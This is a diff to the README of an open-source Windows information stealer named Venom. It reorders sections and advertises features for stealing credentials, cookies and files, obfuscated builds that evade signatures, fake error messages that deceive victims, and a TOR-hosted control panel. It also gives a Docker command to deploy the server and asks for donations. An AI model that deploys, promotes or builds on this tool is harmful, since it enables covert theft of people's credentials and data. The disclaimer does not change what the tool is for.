@@ -2,7 +2,7 @@
 
 # Venom | Free and open source info-stealer
 Venom is a free (as in freedom) and open source information stealer 
-tool targeting x64 Windows 10/11 systems.
+tool targeting x64 Windows 10/11 systems, written in Go.
 
 </br>
 
@@ -12,7 +12,14 @@ tool targeting x64 Windows 10/11 systems.
 > unethical use of this tool. If you are crimminal and you want to use this tool 
 > for illegal or unethical purposes, please fuck off.
 
-### Features
+---
+
+## 📸 Screenshots
+| **Page:** home                                  | **Page:** data                              | **Page:** build                              |
+| ----------------------------------------------- | ------------------------------------------- | -------------------------------------------- |
+| ![](assets/home.png) ![](assets/connection.png) | ![](assets/data.png) ![](assets/cookie.png) | ![](assets/build.png) ![](assets/builds.png) |
+
+## Features
 - 🐳 Easy setup with Docker
 - 🖱️ Web interface over TOR
 - 👾 Compile time obfuscated builds for unique signatures  
@@ -22,16 +29,9 @@ tool targeting x64 Windows 10/11 systems.
 - 📂 Steal files from the disk
 - 🚫 Display fake error message to trick the user
 - 🤏 Fairly small build sizes (~4MB)
-- 🚩 Multi-language support
-  * 🇬🇧 English
-  * 🇹🇷 Turkish 
+- 🚩 Multi-language support (🇬🇧 English and 🇹🇷 Turkish)
 
-### Screenshots
-| **Page:** home                                  | **Page:** data                              | **Page:** build                              |
-| ----------------------------------------------- | ------------------------------------------- | -------------------------------------------- |
-| ![](assets/home.png) ![](assets/connection.png) | ![](assets/data.png) ![](assets/cookie.png) | ![](assets/build.png) ![](assets/builds.png) |
-
-### Setup 
+## 🚀 Setup 
 For a minimal setup, the server requirements are:
 - Static IP
 - At least 512MB memory
@@ -48,19 +48,15 @@ docker run -d -p 80:8082           \
     ghcr.io/ngn13/venom:latest
 ```
 Then checkout the logs for the server (`docker logs <id>`) to learn the onion 
-address, so you can access the interface over TOR.
-
-Check out the [docs](docs/advanced.md) for a more advanced setup.
+address, so you can access the interface over TOR. Please check out the [docs](docs/advanced.md) 
+for a more advanced setup.
 
 If you are having any problems then [create an issue](https://github.com/ngn13/ezcat/issues/new).
 
-### Contribute
+## ❤️ Contribute
 If like this project, then please consider contributing! You can do so by
 adding new features, fixing bugs, [adding translations](docs/translate.md) or by 
-just leaving a star! 
-
-### Donate
-You can support contributers/developers by donating:
+just leaving a star! You can also support contributers/developers by donating:
 
 | Contributer                     | Monero (XMR) Address                                                                            |
 | ------------------------------- | ----------------------------------------------------------------------------------------------- |
